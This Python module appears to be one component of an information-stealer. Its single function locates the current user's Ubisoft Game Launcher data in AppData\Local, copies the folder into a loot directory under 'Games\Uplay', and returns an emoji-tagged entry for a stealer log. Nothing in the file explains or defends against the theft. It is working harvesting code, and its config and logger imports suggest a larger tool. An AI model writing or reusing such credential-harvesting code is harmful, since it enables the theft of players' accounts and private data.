
from os import sep,environ
from shutil import copytree
from manager.logger import Log
from preferences.config import config

def Ubisoft():
    try:
        path = r"\Ubisoft Game Launcher"
        msgInfo=""
        user = environ['USERPROFILE']
        pathtofile = f'{user}\\{config.pathToLogs}'
        local = user + sep + r'AppData\Local'
        copytree(local+ sep + path,f'{pathtofile}\\Games\\Uplay')
        msgInfo+="\n∟🎮Uplay"
        return msgInfo
    except Exception as error:
        Log(f"Ubisoft(Uplay) ---> {error}")
        return msgInfo